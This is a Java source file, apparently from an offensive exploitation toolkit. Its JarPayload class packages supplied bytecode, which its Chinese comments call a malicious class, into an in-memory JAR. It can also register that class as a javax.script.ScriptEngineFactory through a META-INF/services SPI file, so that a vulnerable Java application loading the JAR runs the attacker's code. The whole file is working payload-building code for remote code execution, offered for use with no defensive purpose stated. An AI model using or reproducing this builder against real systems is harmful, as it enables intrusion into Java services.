package cn.butler.thirdparty.payloads.JarHandle;

import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;

import javax.script.ScriptEngineFactory;
import java.io.ByteArrayOutputStream;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class JarPayload {
    public static byte[] create(String className, byte[] byteCode) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        try (JarOutputStream jos = new JarOutputStream(baos)) {
            // 写入恶意 class 文件
            JarEntry entry = new JarEntry(className.replace(".", "/") + ".class");
            jos.putNextEntry(entry);
            jos.write(byteCode);
            jos.closeEntry();
        }

        // 返回 jar 内容
        return baos.toByteArray();
    }
    public static byte[] createWithSPI(String className, byte[] byteCode) throws Exception {
        Object[] objects = (Object[]) ClassHandleUtil.addInterfaceForClass(className, byteCode, ScriptEngineFactory.class.getName());
        byteCode = (byte[])objects[1];

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (JarOutputStream jos = new JarOutputStream(baos)) {
            // 写入恶意 class 文件
            JarEntry entry = new JarEntry(className.replace(".", "/") + ".class");
            jos.putNextEntry(entry);
            jos.write(byteCode);
            jos.closeEntry();

            // 写入 SPI 文件
            entry = new JarEntry("META-INF/services/javax.script.ScriptEngineFactory");
            jos.putNextEntry(entry);
            jos.write(className.getBytes());
            jos.closeEntry();
        }

        // 返回 jar 内容
        return baos.toByteArray();
    }
}
